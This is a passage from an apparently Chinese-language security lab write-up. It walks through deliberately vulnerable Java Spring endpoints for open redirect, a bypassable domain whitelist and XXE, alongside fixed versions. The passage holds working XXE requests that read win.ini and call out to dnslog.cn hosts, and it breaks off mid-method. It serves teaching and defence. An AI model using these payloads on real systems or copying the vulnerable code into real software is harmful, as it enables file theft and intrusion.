title="URLRedirect"></a>URLRedirect</h2><p>url重定向漏洞主要用来钓鱼，重定向跳转代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//直接拼接 url </span><br><span class="hljs-meta">@GetMapping(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url;<br>&#125;<br><br><span class="hljs-comment">//设置任意重定向头，手动设置 Location 响应头</span><br><span class="hljs-meta">@RequestMapping(&quot;/setHeader&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="hljs-comment">// 301 redirect</span><br>        response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url);<br>    &#125;<br><br><span class="hljs-comment">//用户控制跳转目标。自动设置状态码为 302 并写入 Location 头</span><br><span class="hljs-meta">@RequestMapping(&quot;/sendRedirect&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.sendRedirect(url); <span class="hljs-comment">// 302 redirect</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">//u</span>rlRedirect<span class="hljs-regexp">/redirect?url=http:/</span>/www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943493.png" alt="20250726134558956"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943956.png" alt="20250726134611955"></p><h2 id="URLWhiteList"><a href="#URLWhiteList" class="headerlink" title="URLWhiteList"></a>URLWhiteList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/url_bypass&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">url_bypass</span><span class="hljs-params">(String url, HttpServletResponse res)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    logger.info(<span class="hljs-string">&quot;url:  &quot;</span> + url);<br><br>    <span class="hljs-comment">//检查 url 是否是以 http:// 或 https:// 开头</span><br>    <span class="hljs-keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>    <span class="hljs-comment">//从 URL 对象中获取域名部分</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    logger.info(<span class="hljs-string">&quot;host:  &quot;</span> + host);<br><br>    <span class="hljs-comment">//遍历配置的域名白名单 domainwhitelist</span><br>    <span class="hljs-comment">// endsWith .</span><br>    <span class="hljs-keyword">for</span> (String domain : domainwhitelist) &#123;<br>        <span class="hljs-keyword">if</span> (host.endsWith(<span class="hljs-string">&quot;.&quot;</span> + domain)) &#123;<br>            res.sendRedirect(url);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br></code></pre></td></tr></table></figure><ul><li>创建一个 Java 标准库的 <code>URL</code> 对象，用于解析 <code>url</code> 字符串的结构。</li><li>比如：<br> <code>url = &quot;https://www.example.com:8080/path?q=1&quot;</code><br> 则：<ul><li><code>u.getHost()</code> &#x3D; <code>&quot;www.example.com&quot;</code></li><li><code>u.getPort()</code> &#x3D; <code>8080</code></li><li><code>u.getPath()</code> &#x3D; <code>&quot;/path&quot;</code></li></ul></li></ul><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><blockquote><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><h3 id="1-xmlReader-vuln"><a href="#1-xmlReader-vuln" class="headerlink" title="1.&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xmlReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有禁用 <code>DOCTYPE</code> 与实体相关的 SAX 特性</p><blockquote><p>SAX（Simple API for XML）解析器是一种基于事件驱动的解析方式，用于处理XML文档。与DOM解析器不同，SAX不需要将整个文档加载到内存中，因此对于大型文件尤其有用。</p></blockquote><p>POC:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/xmlReader/vuln HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包 <code>http://127.0.0.1:8081/xxe/xmlReader/vuln</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943742.png" alt="20250727115850184"></p><p>修改为 POST 提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>已经触发了 XML 解析逻辑，但是没有读取文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944650.png" alt="20250727120554070"></p><p>换一种：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>说明服务端 确实解析并触发了外部实体加载，访问了构造的恶意 URL</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944167.png" alt="20250727121029322"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944742.png" alt="20250727121019973"></p><h3 id="2-xmlReader-sec"><a href="#2-xmlReader-sec" class="headerlink" title="2.&#x2F;xmlReader&#x2F;sec"></a>2.&#x2F;xmlReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        <span class="hljs-comment">// fix code start</span><br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//fix code end</span><br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改后的方法禁用 <code>DOCTYPE</code> 声明，禁用外部实体（GENERAL + PARAMETER）</p><h3 id="3-SAXBuilder-vuln"><a href="#3-SAXBuilder-vuln" class="headerlink" title="3.&#x2F;SAXBuilder&#x2F;vuln"></a>3.&#x2F;SAXBuilder&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-comment">//创建一个 JDOM2 的 SAXBuilder 实例，它用于将 XML 字符串解析成一个 JDOM Document 对象</span><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// cause xxe</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SAXBuilder</code> 默认开启了对 <strong>外部实体</strong> 的支持</p><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXBuilder/vuln</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> 127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://v50sch.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944871.png" alt="20250727122448607"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944391.png" alt="20250727122444351"></p><h3 id="4-SAXBuilder-sec"><a href="#4-SAXBuilder-sec" class="headerlink" title="4.&#x2F;SAXBuilder&#x2F;sec"></a>4.&#x2F;SAXBuilder&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String 